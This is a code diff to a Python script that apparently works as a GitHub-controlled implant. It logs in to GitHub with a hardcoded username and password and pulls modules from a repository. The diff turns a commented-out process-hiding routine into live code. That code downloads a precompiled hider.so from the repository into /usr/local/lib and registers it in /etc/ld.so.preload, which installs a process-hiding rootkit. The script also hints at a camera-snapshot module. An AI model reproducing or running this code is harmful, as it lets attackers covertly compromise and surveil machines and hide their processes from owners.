@@ -6,7 +6,8 @@ import base64
 import time
 import os
 from github3 import login
-
+from subprocess import call
+import urllib
 def connect_to_github() :
 	gh = login("mehdi-desu",password="1090prixttc")
 	repo = gh.repository("mehdi-desu","projet_impossible")
@@ -37,21 +38,15 @@ def store_module_result() :
 	gh,repo,branch = connect_to_github()
 	repo.create_file("data/ss.txt","add a file", "a stupid string")
 
-
+ 
 def hide():
-	hider = get_file_contents("modules/hider.c")
-	f = open("processhider.c","w")
-	f.write(hider)
-	f.close
-#	os.system("gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl")
-#	os.rename("libprocesshider.so","/usr/local/lib/libprocesshider.so")
-#	ff = open("/etc/ld.so.preload","w")
-#	ff.write("/usr/local/lib/libprocesshider.so")
-#	ff.close()
-
+	urllib.urlretrieve('https://raw.github.com/mehdi-desu/projet_impossible/master/modules/hider.so','/usr/local/lib/hider.so') 
+ 	f = open('/etc/ld.so.preload','w')
+	f.write("/usr/local/lib/hider.so")
+	f.close()
 hide()
 #cam = load_module("cam")
-#while True:
+while True:
 #	cam.snap()
-#	print "ddd"
-#	time.sleep(1)
+	print "ddd"
+	time.sleep(1)
